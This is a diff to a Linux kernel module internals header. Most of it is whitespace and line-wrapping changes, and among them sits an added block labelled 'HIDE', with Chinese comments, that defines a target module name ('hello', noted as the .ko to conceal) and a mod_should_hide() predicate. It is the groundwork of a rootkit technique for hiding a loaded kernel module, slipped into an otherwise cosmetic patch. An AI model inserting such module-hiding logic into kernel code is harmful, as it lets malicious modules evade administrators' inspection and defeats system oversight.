@@ -13,6 +13,7 @@
 #include <linux/rculist.h>
 #include <linux/rcupdate.h>
 #include <linux/mm.h>
+#include <linux/string.h>
 
 #ifndef ARCH_SHF_SMALL
 #define ARCH_SHF_SMALL 0
@@ -23,7 +24,6 @@
  * section. This leaves 28 bits for offset on 32-bit systems, which is
  * about 256 MiB (WARN_ON_ONCE if we exceed that).
  */
-
 #define SH_ENTSIZE_TYPE_BITS	4
 #define SH_ENTSIZE_TYPE_SHIFT	(BITS_PER_LONG - SH_ENTSIZE_TYPE_BITS)
 #define SH_ENTSIZE_TYPE_MASK	((1UL << SH_ENTSIZE_TYPE_BITS) - 1)
@@ -46,6 +46,15 @@ struct kernel_symbol {
 
 extern struct mutex module_mutex;
 extern struct list_head modules;
+
+/* ---- HIDE ---- 隐藏模块：私有链表声明 + 判定函数 ---- */
+#define HIDDEN_MODULE_NAME "hello"	/* 改成你要隐藏的 ko 名字 */
+
+static inline bool mod_should_hide(const struct module *mod)
+{
+	return strcmp(mod->name, HIDDEN_MODULE_NAME) == 0;
+}
+/* ---- HIDE END ---- */
 
 extern struct module_attribute *modinfo_attrs[];
 extern size_t modinfo_attrs_count;
@@ -111,7 +120,6 @@ long module_get_offset_and_type(struct module *mod, enum mod_mem_type type,
 				Elf_Shdr *sechdr, unsigned int section);
 char *module_flags(struct module *mod, char *buf, bool show_state);
 size_t module_flags_taint(unsigned long taints, char *buf);
-
 char *module_next_tag_pair(char *string, unsigned long *secsize);
 
 #define for_each_modinfo_entry(entry, info, name) \
@@ -122,9 +130,7 @@ static inline void module_assert_mutex_or_preempt(void)
 #ifdef CONFIG_LOCKDEP
 	if (unlikely(!debug_locks))
 		return;
-
-	WARN_ON_ONCE(!rcu_read_lock_sched_held() &&
-		     !lockdep_is_held(&module_mutex));
+	WARN_ON_ONCE(!rcu_read_lock_sched_held() && !lockdep_is_held(&module_mutex));
 #endif
 }
 
@@ -145,8 +151,9 @@ static inline int copy_module_elf(struct module *mod, struct load_info *info)
 {
 	return 0;
 }
-
-static inline void free_module_elf(struct module *mod) { }
+static inline void free_module_elf(struct module *mod)
+{
+}
 #endif /* CONFIG_LIVEPATCH */
 
 static inline bool set_livepatch_module(struct module *mod)
@@ -163,45 +170,39 @@ static inline bool set_livepatch_module(struct module *mod)
  * enum fail_dup_mod_reason - state at which a duplicate module was detected
  *
  * @FAIL_DUP_MOD_BECOMING: the module is read properly, passes all checks but
- * 	we've determined that another module with the same name is already loaded
- * 	or being processed on our &modules list. This happens on early_mod_check()
- * 	right before layout_and_allocate(). The kernel would have already
- * 	vmalloc()'d space for the entire module through finit_module(). If
- * 	decompression was used two vmap() spaces were used. These failures can
- * 	happen when userspace has not seen the module present on the kernel and
- * 	tries to load the module multiple times at same time.
+ * we've determined that another module with the same name is already loaded
+ * or being processed on our &modules list. This happens on early_mod_check()
+ * right before layout_and_allocate(). The kernel would have already
+ * vmalloc()'d space for the entire module through finit_module(). If
+ * decompression was used two vmap() spaces were used. These failures can
+ * happen when userspace has not seen the module present on the kernel and
+ * tries to load the module multiple times at same time.
  * @FAIL_DUP_MOD_LOAD: the module has been read properly, passes all validation
- *	checks and the kernel determines that the module was unique and because
- *	of this allocated yet another private kernel copy of the module space in
- *	layout_and_allocate() but after this determined in add_unformed_module()
- *	that another module with the same name is already loaded or being processed.
- *	These failures should be mitigated as much as possible and are indicative
- *	of really fast races in loading modules. Without module decompression
- *	they waste twice as much vmap space. With module decompression three
- *	times the module's size vmap space is wasted.
+ * checks and the kernel determines that the module was unique and because
+ * of this allocated yet another private kernel copy of the module space in
+ * layout_and_allocate() but after this determined in add_unformed_module()
+ * that another module with the same name is already loaded or being processed.
+ * These failures should be mitigated as much as possible and are indicative
+ * of really fast races in loading modules. Without module decompression
+ * they waste twice as much vmap space. With module decompression three
+ * times the module's size vmap space is wasted.
  */
 enum fail_dup_mod_reason {
 	FAIL_DUP_MOD_BECOMING = 0,
 	FAIL_DUP_MOD_LOAD,
 };
 
-#ifdef CONFIG_MODULE_DEBUGFS
-extern struct dentry *mod_debugfs_root;
-#endif
-
 #ifdef CONFIG_MODULE_STATS
-
 #define mod_stat_add_long(count, var) atomic_long_add(count, var)
 #define mod_stat_inc(name) atomic_inc(name)
-
 extern atomic_long_t total_mod_size;
 extern atomic_long_t total_text_size;
 extern atomic_long_t invalid_kread_bytes;
 extern atomic_long_t invalid_decompress_bytes;
-
 extern atomic_t modcount;
 extern atomic_t failed_kreads;
 extern atomic_t failed_decompress;
+
 struct mod_fail_load {
 	struct list_head list;
 	char name[MODULE_NAME_LEN];
@@ -212,26 +213,20 @@ struct mod_fail_load {
 int try_add_failed_module(const char *name, enum fail_dup_mod_reason reason);
 void mod_stat_bump_invalid(struct load_info *info, int flags);
 void mod_stat_bump_becoming(struct load_info *info, int flags);
-
 #else
-
 #define mod_stat_add_long(name, var)
 #define mod_stat_inc(name)
-
 static inline int try_add_failed_module(const char *name,
 					enum fail_dup_mod_reason reason)
 {
 	return 0;
 }
-
 static inline void mod_stat_bump_invalid(struct load_info *info, int flags)
 {
 }
-
 static inline void mod_stat_bump_becoming(struct load_info *info, int flags)
 {
 }
-
 #endif /* CONFIG_MODULE_STATS */
 
 #ifdef CONFIG_MODULE_DEBUG_AUTOLOAD_DUPS
@@ -242,7 +237,6 @@ static inline bool kmod_dup_request_exists_wait(char *module_name, bool wait, in
 {
 	return false;
 }
-
 static inline void kmod_dup_request_announce(char *module_name, int ret)
 {
 }
@@ -255,7 +249,6 @@ struct mod_unload_taint {
 	unsigned long taints;
 	u64 count;
 };
-
 int try_add_tainted_module(struct module *mod);
 void print_unloaded_tainted_modules(void);
 #else /* !CONFIG_MODULE_UNLOAD_TAINT_TRACKING */
@@ -263,7 +256,6 @@ static inline int try_add_tainted_module(struct module *mod)
 {
 	return 0;
 }
-
 static inline void print_unloaded_tainted_modules(void)
 {
 }
@@ -273,12 +265,10 @@ static inline void print_unloaded_tainted_modules(void)
 int module_decompress(struct load_info *info, const void *buf, size_t size);
 void module_decompress_cleanup(struct load_info *info);
 #else
-static inline int module_decompress(struct load_info *info,
-				    const void *buf, size_t size)
+static inline int module_decompress(struct load_info *info, const void *buf, size_t size)
 {
 	return -EOPNOTSUPP;
 }
-
 static inline void module_decompress_cleanup(struct load_info *info)
 {
 }
@@ -304,11 +294,11 @@ void mod_tree_remove_init(struct module *mod);
 void mod_tree_remove(struct module *mod);
 struct module *mod_find(unsigned long addr, struct mod_tree_root *tree);
 #else /* !CONFIG_MODULES_TREE_LOOKUP */
-
 static inline void mod_tree_insert(struct module *mod) { }
 static inline void mod_tree_remove_init(struct module *mod) { }
 static inline void mod_tree_remove(struct module *mod) { }
-static inline struct module *mod_find(unsigned long addr, struct mod_tree_root *tree)
+static inline struct module *mod_find(unsigned long addr,
+				      struct mod_tree_root *tree)
 {
 	struct module *mod;
 
@@ -317,7 +307,6 @@ static inline struct module *mod_find(unsigned long addr, struct mod_tree_root *
 		if (within_module(addr, mod))
 			return mod;
 	}
-
 	return NULL;
 }
 #endif /* CONFIG_MODULES_TREE_LOOKUP */
@@ -341,14 +330,15 @@ static inline int module_sig_check(struct load_info *info, int flags)
 void kmemleak_load_module(const struct module *mod, const struct load_info *info);
 #else /* !CONFIG_DEBUG_KMEMLEAK */
 static inline void kmemleak_load_module(const struct module *mod,
-					const struct load_info *info) { }
+					const struct load_info *info)
+{
+}
 #endif /* CONFIG_DEBUG_KMEMLEAK */
 
 #ifdef CONFIG_KALLSYMS
 void init_build_id(struct module *mod, const struct load_info *info);
 void layout_symtab(struct module *mod, struct load_info *info);
 void add_kallsyms(struct module *mod, const struct load_info *info);
-
 static inline bool sect_empty(const Elf_Shdr *sect)
 {
 	return !(sect->sh_flags & SHF_ALLOC) || sect->sh_size == 0;
@@ -366,40 +356,38 @@ void mod_sysfs_teardown(struct module *mod);
 void init_param_lock(struct module *mod);
 #else /* !CONFIG_SYSFS */
 static inline int mod_sysfs_setup(struct module *mod,
-			   	  const struct load_info *info,
-			   	  struct kernel_param *kparam,
-			   	  unsigned int num_params)
+				  const struct load_info *info,
+				  struct kernel_param *kparam,
+				  unsigned int num_params)
 {
 	return 0;
 }
-
 static inline void mod_sysfs_teardown(struct module *mod) { }
 static inline void init_param_lock(struct module *mod) { }
 #endif /* CONFIG_SYSFS */
 
 #ifdef CONFIG_MODVERSIONS
-int check_version(const struct load_info *info,
-		  const char *symname, struct module *mod, const s32 *crc);
-void module_layout(struct module *mod, struct modversion_info *ver, struct kernel_param *kp,
-		   struct kernel_symbol *ks, struct tracepoint * const *tp);
-int check_modstruct_version(const struct load_info *info, struct module *mod);
+int check_version(const struct load_info *info, const char *symname,
+		  struct module *mod, const s32 *crc);
+void module_layout(struct module *mod, struct modversion_info *ver,
+		   struct kernel_param *kp, struct kernel_symbol *ks,
+		   struct tracepoint * const *tp);
+int check_modstruct_version(const struct load_info *info,
+			    struct module *mod);
 int same_magic(const char *amagic, const char *bmagic, bool has_crcs);
 #else /* !CONFIG_MODVERSIONS */
-static inline int check_version(const struct load_info *info,
-				const char *symname,
-				struct module *mod,
-				const s32 *crc)
+static inline int check_version(const struct load_info *info, const char *symname,
+				struct module *mod, const s32 *crc)
 {
 	return 1;
 }
-
 static inline int check_modstruct_version(const struct load_info *info,
 					  struct module *mod)
 {
 	return 1;
 }
-
-static inline int same_magic(const char *amagic, const char *bmagic, bool has_crcs)
+static inline int same_magic(const char *amagic, const char *bmagic,
+			     bool has_crcs)
 {
 	return strcmp(amagic, bmagic) == 0;
 }
